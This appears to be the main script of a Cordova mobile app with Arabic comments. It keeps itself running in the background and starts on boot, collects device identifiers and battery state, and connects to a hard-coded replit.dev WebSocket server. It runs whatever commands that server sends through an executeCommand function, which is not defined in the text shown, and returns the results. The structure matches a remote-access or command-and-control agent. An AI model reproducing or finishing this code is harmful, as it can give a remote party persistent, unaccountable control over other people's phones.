document.addEventListener('deviceready', onDeviceReady, false);

const receivedRequests = [];
let wsConnection = null;

function onDeviceReady() {
    console.log('Device is ready');

    // تفعيل التشغيل في الخلفية
    if (cordova.plugins.backgroundMode) {
        cordova.plugins.backgroundMode.enable();
        cordova.plugins.backgroundMode.setDefaults({
            title: 'التطبيق يعمل في الخلفية',
            text: 'جارٍ مراقبة الأوامر',
            silent: false
        });
    }

    // تشغيل خدمة Foreground Service
    if (cordova.plugins.foregroundService) {
        cordova.plugins.foregroundService.start(
            'التطبيق يعمل',
            'جارٍ مراقبة الأوامر في الخلفية',
            'ic_stat_icon'
        );
    }

    // التفعيل التلقائي عند التشغيل
    if (cordova.plugins.autoStart) {
        cordova.plugins.autoStart.enable();
        cordova.plugins.autoStart.enableBootStart();
    }

    // معلومات الجهاز
    const deviceInfo = {
        uuid: device.uuid || generateUUID(),
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown',
        battery: null,
        timestamp: new Date().toISOString()
    };

    // الحصول على حالة البطارية
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            deviceInfo.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging
            };
            connectToServer(deviceInfo);
        });
    } else {
        connectToServer(deviceInfo);
    }

    // إعادة الاتصال عند استئناف التطبيق
    document.addEventListener('resume', () => {
        if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) {
            console.log('App resumed, reconnecting...');
            connectToServer(deviceInfo);
        }
    }, false);
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function connectToServer(deviceInfo) {
    const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
    wsConnection = new WebSocket(wsUrl);

    wsConnection.onopen = () => {
        console.log('Connected to server');
    };

    wsConnection.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            executeCommand(data, (response) => {
                if (wsConnection.readyState === WebSocket.OPEN) {
                    wsConnection.send(JSON.stringify(response));
                }
            });
        } catch (err) {
            console.error('Invalid message:', err);
        }
    };

    wsConnection.onerror = (error) => {
        console.error('WebSocket error:', error);
    };

    wsConnection.onclose = () => {
        console.log('Disconnected, retrying in 10s...');
        setTimeout(() => connectToServer(deviceInfo), 10000);
    };

    // إرسال نبضات قلبية كل 30 ثانية
    setInterval(() => {
        if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
                type: 'heartbeat',
                timestamp: new Date().toISOString(),
                receivedRequests
            }));
        }
    }, 30000);
}
